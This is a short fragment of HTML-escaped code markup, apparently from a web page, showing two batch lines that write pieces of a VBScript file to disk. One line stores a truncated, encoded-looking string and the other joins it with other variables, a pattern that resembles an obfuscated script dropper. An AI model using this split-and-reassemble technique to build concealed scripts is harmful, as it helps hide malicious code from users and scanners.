&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo d = &amp;quot;JwUjNZdVZuW…&amp;quot; &amp;gt;&amp;gt; &amp;quot;%a%\b.vbs&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo e = b ^&amp;amp; d ^&amp;amp; c &amp;gt;&amp;gt; &amp;quot;%a%\b.vbs&amp;quot;
